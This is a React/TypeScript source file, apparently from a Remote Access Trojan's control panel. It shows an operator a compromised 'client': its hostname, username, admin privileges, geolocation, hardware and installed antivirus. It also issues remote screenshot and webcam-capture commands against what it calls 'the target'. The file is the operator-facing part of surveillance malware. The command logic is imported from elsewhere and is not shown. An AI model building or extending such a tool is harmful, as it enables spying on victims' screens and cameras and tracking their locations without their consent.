import { RATClient } from "../../../types";
import { useState, useEffect } from "react";
import { listen } from "@tauri-apps/api/event";
import { takeScreenshotCmd, takeWebcamCmd } from "../../rat/RATCommands";
import {
  IconSquareRoundedX,
  IconCamera,
  IconPhotoScan,
  IconDeviceLaptop,
  IconDeviceDesktop,
  IconUser,
  IconServer,
  IconCpu,
  IconDeviceDesktopAnalytics,
  IconShieldCheck,
  IconDeviceSdCard,
  IconBrandWindows,
  IconBrandUbuntu,
  IconCameraPlus,
  IconVideo,
  IconRefresh,
  IconMapPin,
} from "@tabler/icons-react";

export const ClientInfo = ({
  client,
  onClose,
}: {
  client: RATClient;
  onClose: () => void;
}) => {
  if (!client) return null;

  const [screenshot, setScreenshot] = useState<string | null>(null);
  const [isScreenshotLoading, setIsScreenshotLoading] = useState(false);
  const [webcamImage, setWebcamImage] = useState<string | null>(null);
  const [isWebcamLoading, setIsWebcamLoading] = useState(false);
  const [activeSection, setActiveSection] = useState<string>("system");

  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      if (e.key === "Escape") {
        onClose();
      }
    };

    window.addEventListener("keydown", handleKeyDown);
    return () => window.removeEventListener("keydown", handleKeyDown);
  }, [onClose]);

  async function waitScreenshot() {
    listen("client_screenshot", (event) => {
      // Extract the data URL from the payload
      const payload = event.payload as { addr: string; data: string };
      setScreenshot(payload.data);
      setIsScreenshotLoading(false);
    });
  }

  async function waitWebcamResult() {
    listen("webcam_result", (event) => {
      // Extract the data URL from the payload
      const payload = event.payload as { addr: string; data: string };
      setWebcamImage(payload.data);
      setIsWebcamLoading(false);
    });
  }

  useEffect(() => {
    waitScreenshot();
    waitWebcamResult();
  }, []);

  async function takeScreenshot(client: RATClient, display: number) {
    setIsScreenshotLoading(true);
    await takeScreenshotCmd(client.addr, display);
  }

  async function captureWebcam() {
    setIsWebcamLoading(true);
    try {
      await takeWebcamCmd(client.addr);
    } catch (error) {
      console.error("Error requesting webcam:", error);
      setIsWebcamLoading(false);
    }
  }

  // Helper to determine OS icon
  const getOsIcon = () => {
    if (client.os.toLowerCase().includes("windows")) {
      return <IconBrandWindows size={20} className="text-blue-400" />;
    } else if (
      client.os.toLowerCase().includes("linux") ||
      client.os.toLowerCase().includes("ubuntu")
    ) {
      return <IconBrandUbuntu size={20} className="text-orange-400" />;
    } else {
      return <IconDeviceDesktop size={20} className="text-gray-400" />;
    }
  };

  // Get country flag SVG path based on country code
  const getCountryFlagPath = (countryCode: string) => {
    if (!countryCode || countryCode === "N/A") return "";
    
    const code = countryCode.toLowerCase();
    return `/country_flags/${code}.svg`;
  };

  return (
    <div className="relative bg-secondarybg p-4 rounded-xl text-white h-full flex flex-col">
      {/* Header */}
      <div className="flex justify-between items-center mb-4 border-b border-gray-700 pb-3">
        <h2 className="text-xl font-bold flex items-center gap-2">
          {getOsIcon()}
          <span className="truncate">{client.hostname}</span>
        </h2>
        <button
          onClick={onClose}
          className="text-accentx hover:text-white transition cursor-pointer"
          aria-label="Close details"
        >
          <IconSquareRoundedX size={28} />
        </button>
      </div>

      {/* Tabs */}
      <div className="flex mb-4 border-b border-gray-700">
        <button
          className={`py-2 px-4 flex items-center gap-1 cursor-pointer ${
            activeSection === "system"
              ? "text-white border-b-2 border-accentx"
              : "text-gray-400 hover:text-white"
          }`}
          onClick={() => setActiveSection("system")}
        >
          <IconServer size={16} />
          <span>System</span>
        </button>
        <button
          className={`py-2 px-4 flex items-center gap-1 cursor-pointer ${
            activeSection === "screenshot"
              ? "text-white border-b-2 border-accentx"
              : "text-gray-400 hover:text-white"
          }`}
          onClick={() => setActiveSection("screenshot")}
        >
          <IconCamera size={16} />
          <span>Screenshot</span>
        </button>
        <button
          className={`py-2 px-4 flex items-center gap-1 cursor-pointer ${
            activeSection === "webcam"
              ? "text-white border-b-2 border-accentx"
              : "text-gray-400 hover:text-white"
          }`}
          onClick={() => setActiveSection("webcam")}
        >
          <IconVideo size={16} />
          <span>Webcam</span>
        </button>
      </div>

      {/* Main content */}
      <div className="flex-1 overflow-y-auto">
        {activeSection === "system" && (
          <div className="space-y-4">
            {/* Connection info */}
            <div className="bg-primarybg rounded-lg p-3">
              <h3 className="text-accentx font-semibold mb-2 text-sm">
                CONNECTION
              </h3>
              <div className="grid grid-cols-2 gap-3">
                <div>
                  <div className="text-xs text-gray-400">Address</div>
                  <div className="font-mono text-sm">{client.addr}</div>
                </div>
                <div>
                  <div className="text-xs text-gray-400">Group</div>
                  <div className="text-sm">{client.group}</div>
                </div>
              </div>
            </div>

            {/* User info */}
            <div className="bg-primarybg rounded-lg p-3">
              <h3 className="text-accentx font-semibold mb-2 text-sm flex items-center gap-1">
                <IconUser size={16} />
                <span>USER</span>
              </h3>
              <div className="grid grid-cols-2 gap-3">
                <div>
                  <div className="text-xs text-gray-400">Username</div>
                  <div className="text-sm">{client.username}</div>
                </div>
                <div>
                  <div className="text-xs text-gray-400">Privileges</div>
                  <div className="text-sm flex items-center gap-1">
                    {client.is_elevated ? (
                      <>
                        <span className="text-green-400">Administrator</span>
                        <IconShieldCheck size={16} className="text-green-400" />
                      </>
                    ) : (
                      <span className="text-gray-300">Standard User</span>
                    )}
                  </div>
                </div>
              </div>
            </div>

            {/* Location info */}
            <div className="bg-primarybg rounded-lg p-3">
              <h3 className="text-accentx font-semibold mb-2 text-sm flex items-center gap-1">
                <IconMapPin size={16} />
                <span>LOCATION</span>
              </h3>
              <div className="grid grid-cols-3 gap-3">
                <div>
                  <div className="text-xs text-gray-400">Country</div>
                  <div className="text-sm">
                    {client.country_code && client.country_code !== "N/A" ? (
                      <div className="flex items-center gap-2">
                        <img 
                          src={getCountryFlagPath(client.country_code)}
                          alt={client.country_code}
                          className="w-6 h-4 object-cover"
                        />
                        <span>{client.country_code}</span>
                      </div>
                    ) : (
                      "N/A"
                    )}
                  </div>
                </div>
                <div>
                  <div className="text-xs text-gray-400">Latitude</div>
                  <div className="text-sm">
                    {client.latitude && client.latitude !== "N/A" ? 
                      parseFloat(client.latitude).toFixed(4) : "N/A"
                    }
                  </div>
                </div>
                <div>
                  <div className="text-xs text-gray-400">Longitude</div>
                  <div className="text-sm">
                    {client.longitude && client.longitude !== "N/A" ? 
                      parseFloat(client.longitude).toFixed(4) : "N/A"
                    }
                  </div>
                </div>
              </div>
            </div>

            {/* System info */}
            <div className="bg-primarybg rounded-lg p-3">
              <h3 className="text-accentx font-semibold mb-2 text-sm flex items-center gap-1">
                <IconDeviceDesktopAnalytics size={16} />
                <span>SYSTEM</span>
              </h3>
              <div className="space-y-3">
                <div>
                  <div className="text-xs text-gray-400">Operating System</div>
                  <div className="text-sm flex items-center gap-1">
                    {getOsIcon()}
                    <span>{client.os}</span>
                  </div>
                </div>

                <div>
                  <div className="text-xs text-gray-400">CPU</div>
                  <div className="text-sm flex items-center gap-1">
                    <IconCpu size={16} className="text-blue-300" />
                    <span>{client.cpu}</span>
                  </div>
                </div>

                <div>
                  <div className="text-xs text-gray-400">RAM</div>
                  <div className="text-sm">{client.ram}</div>
                </div>

                <div>
                  <div className="text-xs text-gray-400">GPU</div>
                  <div className="text-sm">
                    {client.gpus.map((gpu, index) => (
                      <div key={index}>{gpu}</div>
                    ))}
                  </div>
                </div>

                <div>
                  <div className="text-xs text-gray-400">Storage</div>
                  <div className="text-sm flex items-center flex-wrap gap-2">
                    {client.storage.map((drive, index) => (
                      <div key={index} className="flex items-center gap-1">
                        <IconDeviceSdCard
                          size={16}
                          className="text-amber-300"
                        />
                        <span>{drive}</span>
                      </div>
                    ))}
                  </div>
                </div>
              </div>
            </div>

            {/* Security info */}
            <div className="bg-primarybg rounded-lg p-3">
              <h3 className="text-accentx font-semibold mb-2 text-sm flex items-center gap-1">
                <IconShieldCheck size={16} />
                <span>SECURITY</span>
              </h3>
              <div>
                <div className="text-xs text-gray-400">Installed Antivirus</div>
                {client.installed_avs.length > 0 ? (
                  <div className="text-sm">
                    {client.installed_avs.map((av, index) => (
                      <div key={index} className="text-amber-300">
                        {av}
                      </div>
                    ))}
                  </div>
                ) : (
                  <div className="text-sm text-green-400">
                    No antivirus detected
                  </div>
                )}
              </div>
            </div>
          </div>
        )}

        {activeSection === "screenshot" && (
          <div className="space-y-4">
            {/* Screenshot display */}
            <div
              className={`w-full aspect-[16/9] border border-accentx rounded-xl flex items-center justify-center bg-primarybg overflow-hidden ${
                isScreenshotLoading ? "animate-pulse" : ""
              }`}
            >
              {screenshot ? (
                <img
                  src={screenshot}
                  alt="Screenshot"
                  className="max-w-full max-h-full rounded-lg"
                />
              ) : (
                <div className="flex flex-col items-center justify-center text-gray-400">
                  <IconPhotoScan size={48} />
                  <p className="text-sm mt-2">No screenshot available</p>
                  {isScreenshotLoading && (
                    <p className="text-xs mt-1 text-accentx">Loading...</p>
                  )}
                </div>
              )}
            </div>

            {/* Display selection */}
            <div className="bg-primarybg rounded-lg p-3">
              <h3 className="text-accentx font-semibold mb-2 text-sm">
                DISPLAYS ({client.displays})
              </h3>
              <div className="flex flex-wrap gap-2">
                {client &&
                  [...Array(client.displays).keys()].map((index) => (
                    <button
                      key={index}
                      onClick={() => takeScreenshot(client, index)}
                      disabled={isScreenshotLoading}
                      className={`flex items-center gap-1 rounded-full px-3 py-1.5 border cursor-pointer 
                        ${
                          isScreenshotLoading
                            ? "border-gray-600 text-gray-400 cursor-not-allowed"
                            : "border-accentx text-white hover:bg-accentx/30 transition"
                        }`}
                    >
                      <IconDeviceLaptop size={16} />
                      <span>Display {index}</span>
                    </button>
                  ))}
              </div>
            </div>
          </div>
        )}

        {activeSection === "webcam" && (
          <div className="space-y-4">
            {/* Webcam display */}
            <div
              className={`w-full aspect-[4/3] border border-accentx rounded-xl flex items-center justify-center bg-primarybg overflow-hidden ${
                isWebcamLoading ? "animate-pulse" : ""
              }`}
            >
              {webcamImage ? (
                <img
                  src={webcamImage}
                  alt="Webcam capture"
                  className="max-w-full max-h-full rounded-lg"
                />
              ) : (
                <div className="flex flex-col items-center justify-center text-gray-400">
                  <IconVideo size={48} />
                  <p className="text-sm mt-2">No webcam image available</p>
                  {isWebcamLoading && (
                    <p className="text-xs mt-1 text-accentx">
                      Accessing webcam...
                    </p>
                  )}
                </div>
              )}
            </div>

            {/* Webcam controls */}
            <div className="bg-primarybg rounded-lg p-3">
              <div className="flex justify-between items-center">
                <h3 className="text-accentx font-semibold text-sm flex items-center gap-1">
                  <IconVideo size={16} />
                  <span>WEBCAM CAPTURE</span>
                </h3>
                <div className="flex gap-2">
                  <button
                    onClick={captureWebcam}
                    disabled={isWebcamLoading}
                    className={`cursor-pointer flex items-center gap-1 rounded-full px-3 py-1.5 border
                      ${
                        isWebcamLoading
                          ? "border-gray-600 text-gray-400 cursor-not-allowed"
                          : "border-accentx text-white hover:bg-accentx/30 transition"
                      }`}
                  >
                    {webcamImage ? (
                      <>
                        <IconRefresh size={16} />
                        <span>Refresh</span>
                      </>
                    ) : (
                      <>
                        <IconCameraPlus size={16} />
                        <span>Capture</span>
                      </>
                    )}
                  </button>
                </div>
              </div>
              {isWebcamLoading && (
                <p className="text-xs mt-2 text-gray-400">
                  This may take a few seconds. The target will see a webcam
                  permission prompt.
                </p>
              )}
            </div>
          </div>
        )}
      </div>
    </div>
  );
};
